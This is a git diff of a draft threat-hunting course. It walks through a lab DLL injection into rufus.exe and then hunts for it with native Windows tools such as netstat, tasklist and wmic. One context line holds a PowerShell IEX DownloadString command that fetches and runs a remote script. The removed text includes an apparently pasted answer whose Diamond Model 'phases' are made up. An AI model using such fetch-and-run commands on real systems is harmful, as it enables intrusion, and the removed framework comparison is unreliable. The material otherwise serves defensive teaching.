@@ -699,14 +699,11 @@ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com
 
 Note that after you run it there won't be any feedback/output. In case you did not know this is almost universally true: when it comes to PowerShell, not receiving any feedback/output almost always means the command ran succesfully. If there was an error, you'll get some red text telling you what went wrong. 
 
-
-
-
 Great so the script that will inject `evil.dll` into a process memory space is now in memory. But to be clear: though we've injected that script into memory, but we've not yet executed it. We're about to do so, but before that there's one thing we need. Remeber in the beginning when I explained about how dll-injections work I said that we basically "trick" a legit process into running code from a malicious DLL. So this script is what's going to be doing the trickery, we of course have our malicious DLL which we transferred over, so taht means we only need a legit process.
 
-Now it used to be the case that you could eaasily inject into any process, including native Windows processes like notepad and calculator. You'll notice if you do some older tutorials, they'll almopst always choose one of these two as the example. However, though there are potential workarounds, this has become more ciomplicated since Windows 10 - if you're curious to know why [see here.](https://security.stackexchange.com/questions/197409/why-doesnt-dll-injection-works-on-windows-10-for-native-windows-binaries-e-g)
+Now it used to be the case that you could easily inject into any process, including native Windows processes like notepad and calculator. You'll notice if you do some older tutorials, they'll almost always choose one of these two as the example. However, though there are potential workarounds, this has become more ciomplicated since Windows 10 - if you're curious to know why [see here.](https://security.stackexchange.com/questions/197409/why-doesnt-dll-injection-works-on-windows-10-for-native-windows-binaries-e-g)
 
-So as to not overcomplicate things, and because it's not really all that unrealistic to expect a non-native Windows executable to be running on a victim's system, I'll be running a portable executable called rufus.exe. It's a very small, simple program that creates bootable usb drives, but taht's irrelevant we just need some process. If you really wanted to run the same thing you can [get it here](https://rufus.ie/en/), otherwise feel free to run any other program as longs as its not a native Windows one. 
+So as to not overcomplicate things, and because it's not really all that unrealistic to expect a non-native Windows executable to be running on a victim's system, I'll be running a portable executable called rufus.exe. It's a very small, simple program that creates bootable usb drives, but that's irrelevant we just need some process. If you really wanted to run the same thing you can [get it here](https://rufus.ie/en/), otherwise feel free to run any other program as longs as its not a native Windows one. 
 
 3. So we will run `rufus.exe`. But since we'll need to pass its Process ID (PID) to the script as an argument, we just need to find that real quick. You can either run Task Manager from the gui, or here I'll be running `ps` in PowerShell. And we can see here the PID is 784.
 
@@ -786,7 +783,7 @@ OK so let's just hold back for a second. At this point, if you have your wits ab
 So then the answer is yes. That was cheating - of course. But, it's cheating with a purpose you see, the purpose here being that this is a course on threat hunting and not on initial compromise. So we stripped the actions of the initial compromise down to its core and for now we've foregone our spearfishing email and VBA macro. We've streamlined the essence of the attack - we're expending less energy in the effort, and yet for our intents have created the same outcome. If you wanted a more realistic approximation of the initial compromise + other elements of Red Teaming - [here's a good free resource to get you going](https://www.youtube.com/watch?v=EIHLXWnK1Dw&list=PLBf0hzazHTGMjSlPmJ73Cydh9vCqxukCu)
  
 
-So, we won't be investing our time in completely recraftin an realistic simulation of the intial compromise, HOWEVER, I do think it's very important for us to discuss here what it would look like. We are about to embark on a Threat Hunt, which is an investigation; but there would be no value for us to go attempting to discover things that exists only because of our specific "cheating" method here. Meaning: I want to make sure you understand which parts of the attack we just performed are representative of an actual acttack, and which are not. The reason for this of course is so we can focus on what really matters - ie that which we expect to see following a real-life attack. 
+So, we won't be investing our time in completely recreating a realistic simulation of the intial compromise, HOWEVER, I do think it's very important for us to discuss here what it would look like. We are about to embark on a Threat Hunt, which is an investigation; but there would be no value for us to go attempting to discover things that exists only because of our specific "cheating" method here. Meaning: I want to make sure you understand which parts of the attack we just performed are representative of an actual acttack, and which are not. The reason for this of course is so we can focus on what really matters - ie that which we expect to see following a real-life attack. 
 
 So the remainder of this section will be dedicated to that. I'm very briefly going to review all the main beats to the attack we just performed, thereafter I'll "translate" the actions to their real-world counterpart, pointing out specifically which elements we expect to see in an actual attack, and which we don't. 
 
@@ -829,14 +826,204 @@ Ok friends, thanks for entertaining this little side quest. I do so consciously 
 # Introduction
 So our first analysis will be a quick review using standard (native) Windows tools. These tools are a quick and dirty means to get a finger on the pulse, meaning they'll give us a broad overview of some important indicators while at the same time being limited in the depth of information.
 
-So if we have at our disposal better tools, ie tools that can provide more information, why bother? I'm of the belief (inspired by one the greats, [John Strand](https://twitter.com/strandjs)), that even if there are better tools availalbe you should *also* be able to do so with the native Windows tools. 
+So if we have at our disposal better tools, ie tools that can provide more information, why bother? I'm of the belief (inspired by one the greats, [John Strand](https://twitter.com/strandjs)), that even if there are better tools availalbe you should *also* be able to do a basic analysis with the native Windows tools. 
 
-Tools may change, they come and go, or, you might land in a situation where they are, for whatever reason, unavailable. Knowing how to get a basic read with windows tools in any situation covers your bases. Think of it as learning how to survive in the outdoors - yes you can always make a fire with a lighter, but there's a good reason to also learn how to make it, however cumbersome, with what's always available - it might just save your butt. 
+Tools may change, they come and go, or, you might land in a situation where they are, for whatever reason, unavailable. Knowing how to get a basic read with Windows tools in any situation covers your bases. Think of it as learning how to survive in the outdoors - yes you can always make a fire using a lighter, but there's a good reason to also learn how to make it, however cumbersome, with what's freely available - it might just save your butt in case your lighter fails. 
 
 {{< figure src="/img/survivorman2.gif" title="" class="custom-figure" >}}
 
+# Theory
+You will benefit from understanding the [following short theoretical framework on the '3 Modes of Threat Hunting'](https://www.faanross.com/posts/three_modes/). I leave the decision of whether or not to read it up to you, though it will be referenced throughout the remainder of the course. 
+
 # Performing the Analysis
-There are a number of thi
+There are a number of things we can look at when we do a live analyis using the native tools, including: connections, processes, shares, firewall settings, services, accounts, groups, registry keys, scheduled tasks etc.
+
+For this course we will only focus on connections and processes. If you are keen to learn more about how to investigate the other factors I suggest you view [this excellent talk by John Strand](https://www.youtube.com/watch?v=fEip9gl2MTA). A reminder that at this point we are in Threat Hunting Mode 1 - we presume compromise, but have not yet unearthed any confirmation thereof.
+
+# Connections
+Let's run `netstat`, which will display active network connections and listening ports. After all, most malware serves merely as a way for the adversary to ultimately have a connection to the victim's machine to run commands and exfiltrate data.
+
+So open a PowerShell admin terminal on our Windows 10 system and run the following command:
+```
+netstat -naob
+```
+Note in particular the inclusion of `o` and `b` in our command which will also show the PID, as well as name of executable, involved in each connection.
+
+In the results we can immediately see a variety of connections, as well as ports our system is listening on. Let's especially pay attention to `ESTABLISHED` connections.
+
+And we can scroll through the list and then as threat hunters something unusual should stick out to us:
+
+{{< figure src="/img/image071.png" title="" class="custom-figure" >}}
+
+What exactly is unusual about this? Well even though `rundll32.exe` is a completely legitimate Windows process, it's used to load DLLs. The question then beckons: why exactly is it involved in an outbound connection?
+
+In this case we can see it's connected to another system on our local network, but remember that's only because of our VLAN setup. In an actual attack scenario this would not be the case, meaning we see `rundll32.exe`, a process not known to be involved in creating network connections, now indeed being responsible for establishing a connection to a system outside of our network. 
+
+In a typical scenario we'd immediately want to know more about this IP. Is it known? Is there a business use case associated with it? Are other systems on the network also connecting to it? Because if the answer to all those questions are no - well then we definitely have something strange on our hands.
+
+So let's use our native Windows tools to learn more about this process. To do so however let's just take note of our PID, as can be seen in the image above mine is `3948`, yours will be different. 
+
+# Processes
+
+We want to know more about this process, however we specifically want to know: what command-line options were used to run it, what is it's parent process, and what DLLs are being used by the process.
+
+Let's have a look at the DLLs, staying in our PowerShell terminal we run:
+```
+tasklist /m /fi "pid eq 3948"
+```
+{{< figure src="/img/image072.png" title="" class="custom-figure" >}}
+
+On quick glance nothing seems unusual about this output - no DLL sticks out as being out of placed for `rundll32.exe`. So for now let's move on with the knowledge that we can always circle back and dig deeper if need be. 
+
+Next let's have a look at the Parent Process ID (PPID):
+```
+wmic process where processid=3948 get parentprocessid
+```
+{{< figure src="/img/image073.png" title="" class="custom-figure" >}}
+
+Great, we can see the PPID is `6944`, now let's figure out the name of the process it belongs to:
+```
+wmic process where processid=6944 get Name
+```
+{{< figure src="/img/image074.png" title="" class="custom-figure" >}}
+
+We see thus that the name of the Parent Process, that is the name of the process that spawned `rundll32.exe` is `rufus` - a program used to create bootable thumb drives. 
+
+Now this, on quick glance seems unusual - why is this app needing to call `rundll32.exe`? However, since we're not an expert on this program's design, this could potentially be part of its normal operation - we'd have to jump in deeper to understand that.
+
+However, let's keep the bigger picture in mind again - we came upon `rundll32.exe` because it created a network connection to an external IP. So in that sense, yes this is very weird - why is a program used to create bootable thumb drives spawning `rundll32.exe` which then creates a network connection? Very sus.
+
+One final thing here using our native tools, let's have a look at the command-line arguments:
+```
+wmic process where processid=3948 get commandline
+```
+{{< figure src="/img/image075.png" title="" class="custom-figure" >}}
+
+We can see the command is nude - no arguments are provided. Well, since again the `rundll32.exe` command is typically used to execute a function in a specific DLL file, you would expect to see it accompanied by arguments specifying the DLL file and function it's supposed to execute. But here it's simply executed by itself, again reinforcing our suspicion that something is amiss. 
+
+# Closing Thoughts
+Again we started with an open mind, spotten an unusual process being involved in a network connection, and then using other native Windows tools learned more about this process. And the more we learned, the more our suspicion was confirmed. We can thus, in reference to the Three Modes of Threat Hunting, confidently say we're now in the second mode - building our case. Let's continue exploring in the realm of processes by digging deeper with `Process Hacker`.
+
+***
+
+# 6. Live Forensics: Process Hacker 2
+# Introduction
+I explained, hopefully in a somewhat convincing manner, why it's good practice for us to learn how to use the native Windows tools to get an initial, high-level read. But of course these tools are also limited in what information they can provide.
+
+So now let's bring out the big guns and learn all we can.
+
+{{< figure src="/img/guns.gif" title="" class="custom-figure" >}}
+
+But alas, as these things go, it really behooves us to learn a bit of theory behind what we're going to look at with the intention of understanding why it is we are looking at these things, and what exactly what we will be looking for. 
+
+Indeed, in matters like these, it is beneficial for us to delve into some theory. This will help us better comprehend what we're about to examine. We aim to understand why we are scrutinizing these things. Furthermore, it's essential to clarify exactly what we will be searching for.
+
+# Theory
+
+***"A traditional anti-virus product might look at my payload when I touch disk or load content in a browser. If I defeat that, I win. Now, the battleground is the functions we use to get our payloads into memory. -Raphael Mudge"***
+
+There are a few key properties we want to be on the lookout for when doing live memory analysis with something like `Process Hacker`. BuT, it's very important to know that there are **NO silver bullets**. There are no hard and fast rules where if we see any of the following we can be 100% sure we're dealing with malware. After all, if we could codify the rule there would be no need for us as threat hunters to do it ourselves - it would be trivial to simply write a program that does it automatically for us.
+
+Again we're building a case, and each additionarl piece of evidence serves to decrease the probability of a false positive. We keep this process up until our self-defined threshold has been reached and we're ready to push the big red button. 
+
+Additionally, the process as outline here may give the impression that it typically plays out as a strictly linear process. This is not necessarilly the case - instead of going through our list 1-7 below, we could jump around not only on the list itself, but with other techniqes completely. As a casual example - if we find a suspicious process by following this procedure, we might want to pause and 
+
+have the SOC create a rule to scan the rest of the network looking for the same process. If we for example use **Least Frequency Analysis** and we see the process only occurs on one or two anomalous systems, well that then not only provides supporting evidence, but also gives us the confirmation that we are on the right path and should continue with our live memory analysis. 
+
+Here's a quick overview of our list:
+1. Parent-Child Relationships
+2. Signature - is it valid + who signed?
+3. Current directory
+4. Command-line arguments 
+5. Thread Start Address
+6. Memory Permissions
+7. Memory Content
+
+Let's touch on each a little more:
+1. ***Parent-Child Relationships***
+As we know there exists a tree-like relationship between processes in Windows, meaning an existing process (`Parent`), typically spawn other processes (`Child`). And since in the current age of Living off the Land malware the processes themselves are not inherently suspiocus - after all they are legit processes commonly used by the system - we are more interested in the relationship with Parent and Child. We should always ask: *what spawned what*?
+
+Because often we'll find a parent process that is not suspicious by itself at all, and equally a child process that we'd expect to see running. But the fact that this specific parent spawned that specific child - we'll that's sometimes off. A great example
+
+
+Another thing is certain Parent-Child relatipnship will not only inicate that something is suspicious, but also act as a sort of signature implicating the potential malware involved. For example a classical Cobalt Strike Process Tree might look liek:
+
+
+
+
+
+
+"Process Tree Detection" - shows us all the processes, and their relationships, because fo course it's not only existing in pairs - parents cna have multipole children, some of them can have multiple children etc. So depending on the exact direciton of the relationship, a process may be a parent or a child, meaning a process can be spawned by another process and then of course go ahead and itself spawn a process. 
+
+If you walk into someone's house and see a dog, that's totally normal. Equally, walking into someone's house and seeing a kitten - standard faire. But if you saw a dog giving birth to a kitten, well not so normal then. 
+
+2. Signature - is it valid + who signed?
+3. Current directory
+4. Command-line arguments 
+5. Thread Start Address
+6. Memory Permissions
+7. Memory Content
+
+
+
+Note that 1-4 are not unique to dll-injections, but malware in general. Conversely, 5-7 are characteristics we expect only to see related to dll-injections. 
+
+**Parent-Child relationships**
+
+
+OK FINISH THIS LATER NOW UIT IS RUNNING SO LET'S RUN THROUGH HERE
+
+Note: have to review Eric Conrad and Chad Tilbury to beef out the first few
+
+
+
+
+
+# Performing the Analysis
+# Closing Thoughts
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -863,27 +1050,7 @@ NOTE WE ALSO WANT TO INCLUDE THE ANALYSIS WITH STANDARD WINDOWS TOOLS A LA JOHN 
 
 {{< figure src="/img/quest02.gif" title="" class="custom-figure" >}}
 
-So here we'll discuss a few things we'll be on the lookout for that can serve as red flags. BUT, it's very important to know that there are **NO silver bullet**. There are no hard and fast rules where if we see any of the following we can be 100% sure we're dealing with malware. After all, if we could codify the rule there would be no need for us as threat hunters to do it ourselves - it would be trivial to simply write a program that does it automatically for us.
 
-Thus we'll be on the lookout for a handful of distinct signals, but these are almost always guideposts that help us figure out what needs deeper investigation. Even if somethin shows ALL the signs we list below, this would rather simply mean that we will then run further tests. For example if we see a process bearing many of these traits and we're sufficeintly suspicious we'd likely then have the SOC create a rule and scan the rest of the network. If we for example use **Least Frequency Analysis** and we see the process only occurs on one or two system - well yeah then it's time to get in touch with DFIR. 
-
-Here's a quick overview of our list:
-1. Parent-Child relationships
-2. Signature - is it valid + who signed?
-3. Current directory
-4. Command-line arguments 
-5. Thread Start Address
-6. Memory Permissions
-7. Memory Content
-
-Note that 1-4 are not unique to dll-injections, but malware in general. Conversely, 5-7 are characteristics we expect only to see related to dll-injections. 
-
-**Parent-Child relationships**
-- As we know there exists a tree-like relationship between processes in Windows, meaning an existing process (called the Parent), tpyically spawns other processes (called the Child).
-
-OK FINISH THIS LATER NOW UIT IS RUNNING SO LET'S RUN THROUGH HERE
-
-Note: have to review Eric Conrad and Chad Tilbury to beef out the first few
 
 
 ***
@@ -891,55 +1058,13 @@ Note: have to review Eric Conrad and Chad Tilbury to beef out the first few
 # PART 3: Live Memory Analysis
 
 # THEORY
-# Theory
-# The 3 Phases to a Threat Hunt
-As a Threat Hunter we need to distinguish between three "modes". YES, thrat hunters by definition act as if a compromise has occurred - that is the underlying assumption/tenent from which the very occupation originates. 
-
-PHASE 1 - OPEN-MINDED EXPLORATION
-- But in reality, there is still a time we look at a system anew, look at our preferred places in our preferred manners if we can get some, any, "scent". 
-- We operate with a "beginner's mind here", and do our best to stay objective, free of bias, and look at everything with an open mind.
-
-PHASE 2 - BUILDING A CASE
-- Then there is something that does not smell right, we then catch a whiff of it. Perhaps some strange Parent-Child Process relationhsip shown by Process Hacker or an unusual beaconing persistent connection shown by RITA. 
-- Our interest is defintely piqued, ears perked, but we are not sounding the alarm bells yet. We know that though unlikely, there could still be a legitimate explanation for it. And the last thing we want is to unnecesarrily alert DFIR just to have them immediately contradict your findings. 
-- So in Phase 2 our attention is more narrow, are not looking into the general environment looking for "something in general", no we are looking for something specific.
-- We are building a case, looking for certain pieces of evidence to serve a narrative we are constructing. Each piece of data we uncover layers on top of one another, decreasing the probability of there being a false positive.
-- We continue this up until we our narrative is absed on strong enough supportive evidence as to basically render the probablity of a false positive nil.
-
-PHASE 3 - SUPPORT + COMMUNICATION 
-- Phase 3 can be said to start the moment DFIR is notified.
-- It can also, equally valid, be said to start the moment the Security Event has been reclassified as a Security Incident.
-- Phase 3 can manifest in many ways:
-- We might get strict and highly specific instructions on future actions from DFIR which we likely need to stay true to
-- We might also perform a final few low-risk actions to tie our case together,
-- Additionally we might just work on the actual presentation of the case to the DFIR team, reworking it in such a manner as ensure the highest degree of efficienct and accuracy.
-- Finally, again depending on the exact, the threat hunter might be recruited by DFIR to play a supporting role. 
 
 
-THIS WAS MY IDEA, here is how others have already articulated it:
-Your provided framework is very comprehensive and shows the progression of threat hunting activity from an initial state of unbiased exploration to targeted investigation, to case presentation and potential incident response involvement.
 
-The steps outlined are indeed similar to some cybersecurity frameworks, particularly to threat intelligence and digital forensics incident response (DFIR) practices. Here's a relevant analogy:
 
-1. **Cyber Threat Intelligence Lifecycle**: The Cyber Threat Intelligence (CTI) Lifecycle developed by the SANS Institute is a structured process that ensures the production of actionable intelligence. Its phases mirror your framework: 
 
-   a. **Phase 1: Direction** - Similar to your Phase 1, this is the stage where you plan and direct your threat hunting activities. You decide what you are looking for, in this case, threats, and how you will find them.
 
-   b. **Phase 2: Collection and Processing** - Analogous to your Phase 2, in this phase, you're gathering raw data and information, analyzing it for indicators of compromise (IoCs), and transforming it into intelligence. It’s the step where you might identify a suspicious process or network activity, and start to form a hypothesis.
 
-   c. **Phase 3: Analysis and Production** - In your Phase 3, you've already identified suspicious behavior and are gathering and evaluating additional evidence to validate your findings. This is comparable to the analysis phase in the CTI Lifecycle, where analysts make sense of the collected data and create intelligence products.
-
-   d. **Phase 4: Dissemination and Feedback** - This phase includes your presentation of the case to the DFIR team and potential involvement in the incident response, aligning with the "dissemination and feedback" step in the CTI Lifecycle. It involves sharing the intelligence with stakeholders and getting feedback.
-
-2. **The Diamond Model for Intrusion Analysis**: This is another model that aligns with your framework. Developed by Sergio Caltagirone, Andrew Pendergast and Christopher Betz, the Diamond Model centers on four core features of any intrusion event: adversary, infrastructure, capability, and victim.
-
-   a. **Phase 1: Initial Survey** - Similar to your Phase 1, this involves getting to know the system and looking for any anomalies without any preconceived notion.
-
-   b. **Phase 2: Suspicion and Investigation** - Corresponding to your Phase 2, where the analyst identifies suspicious activity and begins to narrow down their focus, looking for specific evidence to support their hypothesis.
-
-   c. **Phase 3: Mitigation and Response** - This reflects your Phase 3, where the suspected intrusion is escalated to the incident response team, and the threat hunter may be involved in remediation efforts.
-
-While both models described above do not perfectly align with your given framework, they provide a comparable structure of cybersecurity activities. They all encapsulate the progression of cyber threat hunting and response, starting from the initial discovery phase to the investigation and response phase.
 
 For LOG ANALYSIS intro:
 - mention this one usualyl more realm of SOC/SIEM and not Forensics, which usually more focus of threat hutning.
